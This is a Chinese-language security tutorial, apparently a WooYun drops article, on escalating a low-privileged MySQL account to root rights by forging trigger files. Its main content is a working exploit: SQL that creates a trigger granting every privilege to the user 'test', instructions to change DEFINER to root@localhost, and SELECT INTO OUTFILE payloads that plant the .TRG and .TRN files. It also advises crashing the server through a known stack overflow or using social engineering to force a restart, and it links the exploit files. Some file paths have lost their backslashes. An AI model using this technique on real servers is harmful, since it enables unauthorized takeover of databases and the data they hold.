# Mysql Trigger

0x00 什么是触发器
-----------

* * *

触发器（trigger）是数据库提供给程序员和数据分析员来保证数据完整性的一种方法，它是与表事件相关的特殊的储存过程，它的执行不是由程序调用，也不是手工启动，而是由事件来触发，当对一个表进行操作（insert，delete，update）时就会激活它执行。触发器经常用于加强数据的完整性约束和业务规则等。

0x01 问题描述
---------

> a)通过Mysql触发器提权仅仅能获取一个Mysql
> 
> Root权限的Mysql账号，并不是系统提权(系统提权取决于包括mysql是不是以root方式运行的等等很多因素)。
> 
> b)渗透过程中所能利用的触发器提权中，需要提权的账号需要有"File"权限，或者是有能力向mysql的目录下写入文件。
> 
> c)Mysql的触发器有6种类型分别是After insert，After delete，After update和Before
> 
> insert，Before delete，Before update。

在以下版本测试成功：

> a) CentOS 5.5 && Mysql-5.0.51a
> 
> b) Win2003 x86 && Mysql-5.5.24

0x02 工作原理
---------

* * *

a) 因为MySQL的触发器以明文文本的形式保存最对应库的目录下面，形式为触发器文件_.TRG和触发器描述文件_.TRN，可以通过select into outfile方式写入(所以需要"File"权限)。

b) Mysql在定义触发器的时候有一个定义触发器执行角色的字段DEFINER，默认的此字段与建立触发器的角色相同(即与'CREATE DEFINER'字段相同)。如果我们可以上传一个执行角色为root的触发器，那么就能以root权限执行触发语句。

c) 根据触发器的原理，我们本地新建一个触发器，然后修改相关配置，如触发角色，触发条件，触发后执行语句等等，制作exp实现提权。

0x03 实验环境
---------

* * *

Win2003x86 && Mysql-5.5.24，默认安装Mysql，导入一个xxxCMS的数据库"cms"，并为此数据库建立一个普通权限的用户"test" Test 账号添加方式：

```
grant all privileges on cms.* to test@localhost identified by '1234';

```

root执行show databases;的结果：

![enter image description here](http://drops.javaweb.org/uploads/images/80bd4a81fef0a311c344931d02f76d09e189b675.jpg)

root执行select User,Host from mysql.user;的结果：

![enter image description here](http://drops.javaweb.org/uploads/images/8f37691a8a88d18db73a60bf98f075279e21c9bb.jpg)

test执行show databases;

![enter image description here](http://drops.javaweb.org/uploads/images/dd455dc9a976fac845993caa2254bd1e89132ea0.jpg)

test执行use cms;并查询此数据库上存在的触发器show triggers;

![enter image description here](http://drops.javaweb.org/uploads/images/9ccbdb915b59a5eec6778f2d0d65367e8e5fa2ae.jpg)

0x04 实验过程
---------

* * *

a)本地生成触发器文件： 1.首先在本地的Mysql上建立正常的触发器，建立过程：

```
mysql> delimiter //   
            /** 此处定义操作块，在操作块结束前即使遇到;也不去执行，直到遇到结束符(//) **/
mysql> create trigger rootme after update on cms_users for each row 
            /** 建立一个作用于表cms_users的、类型为After update的、名为rootme的触发器，for each row意思是每触发一次，就执行一次执行语句 **/
mysql> begin update mysql.user set Select_priv='Y',Insert_priv='Y',Update_priv='Y',Delete_priv='Y',Create_priv='Y',Drop_priv='Y',Reload_priv='Y',Shutdown_priv='Y',Process_priv='Y',File_priv='Y',Grant_priv='Y',References_priv='Y',Index_priv='Y',Alter_priv='Y',Show_db_priv='Y',Super_priv='Y',Create_tmp_table_priv='Y',Lock_tables_priv='Y',Execute_priv='Y',Repl_slave_priv='Y',Repl_client_priv='Y',Create_view_priv='Y',Show_view_priv='Y',Create_routine_priv='Y',Alter_routine_priv='Y',Create_user_priv='Y',Event_priv='Y',Trigger_priv='Y',Create_tablespace_priv='Y',ssl_type='Y',ssl_cipher='Y',x509_issuer='Y',x509_subject='Y',max_questions='Y',max_updates='Y',max_connections='Y' where User='test';
            /** 默认格式begin为开头加上触发后执行的语句，此处语句为执行修改mysql.user表中test用户的权限的操作 **/
mysql> end;    /** 触发器定义结束标志 **/
mysql> //      /** 操作块结束标志，闭合开头定义的操作块 **/

```

以上sql语句执行完毕就会在数据库cms的目录下生成两个文件：rootme.TRN 和 cms_users.TRG。

打开文件，发现DEFINER字段为：test@localhost

我们将其改为root@localhost，使此触发器触发后执行角色为root。 将这两个文件作为后面的提权Exp保留下来。

b)使用test用户登陆Mysql，并查询此数据库上存在的触发器：

![enter image description here](http://drops.javaweb.org/uploads/images/5b1ca328f581687837dbb1685b6feb1748736d11.jpg)

经过查询触发器为空，我们把前面我们本地生成好的触发器文件上传到对应的数据库目录下，即cms目录下：

```
/** 上传可以使用select * into outfile方式或者其他方式 **/
/**   TRG文件   **/
/**   SELECT 'TYPE=TRIGGERS' into outfile'C:wampbinmysqlmysql5.5.24datacmsrootme.TRG' LINES TERMINATED BY 'ntriggers='CREATE DEFINER=`root`@`localhost` trigger rootme after update on cms_users for each rownbegin nUPDATE mysql.user SET Select_priv='Y', Insert_priv='Y', Update_priv='Y', Delete_priv='Y', Create_priv='Y', Drop_priv='Y', Reload_priv='Y', Shutdown_priv='Y', Process_priv='Y', File_priv='Y', Grant_priv='Y', References_priv='Y', Index_priv='Y', Alter_priv='Y', Show_db_priv='Y', Super_priv='Y', Create_tmp_table_priv='Y', Lock_tables_priv='Y', Execute_priv='Y', Repl_slave_priv='Y', Repl_client_priv='Y', Create_view_priv='Y', Show_view_priv='Y', Create_routine_priv='Y', Alter_routine_priv='Y', Create_user_priv='Y', ssl_type='Y', ssl_cipher='Y', x509_issuer='Y', x509_subject='Y',max_questions='Y', max_updates='Y', max_connections='Y' WHERE User='test';nend'nsql_modes=0ndefiners='root@localhost'nclient_cs_names='gbk'nconnection_cl_names='gbk_chinese_ci'ndb_cl_names='utf8_general_ci'n';    **/
/**   TRN文件   **/
/**   SELECT 'TYPE=TRIGGERNAMEntrigger_table=rootme;' into outfile 'C:wampbinmysqlmysql5.5.24datacmscms_users.TNG';   **/

```

![enter image description here](http://drops.javaweb.org/uploads/images/0998d17ba67dcb4bfff8093bf477ce3fe6ea4b05.jpg)

再次查询Triggers：

![enter image description here](http://drops.javaweb.org/uploads/images/e7e2d7a906986e1c5463639bb87f9a96f7f60c38.jpg)

发现触发器已经写入，前面我们写的触发类型是after update，作用于表cms_users，所以我们这里我们update cms_users这个表来触发。 触发之前mysql.user表：

![enter image description here](http://drops.javaweb.org/uploads/images/ccff87d7f5168082bdcab36e7a67098bc39986ac.jpg)

update cms_users这个表触发执行：

![enter image description here](http://drops.javaweb.org/uploads/images/f6ef688952a50d2461283ed6f7dbbcb320e4cf92.jpg)

触发之后mysql.user表：

![enter image description here](http://drops.javaweb.org/uploads/images/05992199108456af7fd4adb3db73702bb3bf6a14.jpg)

至此，"test"用户所拥有的权限跟"root"用户拥有的权限一致。

文中部分位置"有可能"出现"不识别"的情况,比如上传文件后仍然查询不到触发器，比如触发了触发器修改了test的权限后发现并未生效。此时需要重启数据库重新加载配置，至于重启数据库的方式嘛，可以借鉴社工思路。Mysql5.0版本之前的可以利用之前爆出来的栈溢出漏洞造成MySQL Crash重启，达到重新加载配置文件的目的。

这个栈溢出的原理是使用一个没有grant权限的用户做一个虚假的grant操作，而这个操作是对一个根本不存在但很长(如下攻击实例是10000字符长度的库名，实际达到284个时就会触发)库进行赋权。 http://www.exploit-db.com/exploits/23076/

[文中提到的两个文件](http://drops.wooyun.org/wp-content/uploads/2014/10/%E6%96%87%E4%B8%AD%E6%8F%90%E5%88%B0%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%96%87%E4%BB%B6.zip)